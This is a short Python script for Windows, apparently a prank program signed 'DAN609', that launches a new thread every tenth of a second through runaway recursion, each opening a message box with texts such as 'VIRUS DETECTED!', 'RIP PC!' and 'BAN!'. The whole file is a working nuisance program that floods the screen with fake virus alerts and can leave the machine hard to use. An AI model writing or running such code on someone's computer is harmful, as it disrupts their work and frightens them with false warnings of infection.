import ctypes
import threading
import time
import random
import sys
sys.setrecursionlimit(99999)
messages = ["BAN!", "RIP PC!", "VIRUS DETECTED!", "BY DAN609", " "]
rand = random.choice(messages)
def show_message():
    rand = random.choice(messages)
    ctypes.windll.user32.MessageBoxW(0, rand, rand, 0)

# Создаем и запускаем поток
thread = threading.Thread(target=show_message)
thread.start()

# Основной код продолжает выполняться
def rep():
    time.sleep(00.1)
    thread = threading.Thread(target=show_message)
    thread.start()
    rep()
rep()